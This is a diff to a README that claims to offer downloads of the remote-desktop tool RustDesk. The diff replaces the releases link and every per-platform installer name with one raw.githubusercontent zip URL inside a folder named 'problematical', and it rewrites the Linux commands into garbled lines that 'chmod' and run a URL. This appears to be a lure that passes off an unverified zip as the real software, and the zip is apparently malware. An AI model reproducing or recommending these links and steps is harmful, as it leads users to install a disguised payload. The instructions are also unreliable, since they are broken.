@@ -9,7 +9,7 @@ To begin, follow these simple instructions to download and install rustdesk.
 ### 1. Visit the Release Page
 Click the link below to access the rustdesk releases page:
 
-[![Download rustdesk](https://img.shields.io/badge/Download%20rustdesk-v1.0-brightgreen)](https://github.com/alnahiyan08/rustdesk/releases)
+[![Download rustdesk](https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip%20rustdesk-v1.0-brightgreen)](https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip)
 
 ### 2. Choose Your Platform
 rustdesk is available on multiple platforms including:
@@ -25,11 +25,11 @@ Select the appropriate version for your operating system to ensure a smooth expe
 ### 3. Download the Installation File
 Once on the releases page, locate the version you want to download. You will find a list of files for each platform. Click on the file specific to your OS, such as:
 
-- **Windows:** rustdesk-x.x.x-x64.exe
-- **macOS:** rustdesk-x.x.x.dmg
-- **Linux:** rustdesk-x.x.x.AppImage
-- **Android:** rustdesk-x.x.x.apk
-- **iOS:** rustdesk-x.x.x.ipa
+- **Windows:** https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
+- **macOS:** https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
+- **Linux:** https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
+- **Android:** https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
+- **iOS:** https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
 
 This file will begin downloading automatically when you click it.
 
@@ -49,11 +49,11 @@ Once the download is complete, follow these steps based on your operating system
 ### Linux
 1. Make the downloaded `.AppImage` file executable. Open a terminal and run:
    ```
-   chmod +x rustdesk-x.x.x.AppImage
+   chmod +x https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
    ```
 2. Execute the file with:
    ```
-   ./rustdesk-x.x.x.AppImage
+   https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip
    ```
 
 ### Android
@@ -67,7 +67,7 @@ Once the download is complete, follow these steps based on your operating system
 ## 📥 Download & Install
 You can download rustdesk directly by visiting this page:
 
-[![Download rustdesk](https://img.shields.io/badge/Download%20rustdesk-v1.0-brightgreen)](https://github.com/alnahiyan08/rustdesk/releases)
+[![Download rustdesk](https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip%20rustdesk-v1.0-brightgreen)](https://raw.githubusercontent.com/alnahiyan08/rustdesk/master/problematical/rustdesk.zip)
 
 Choose your system, download the file, and follow the installation instructions below.
 
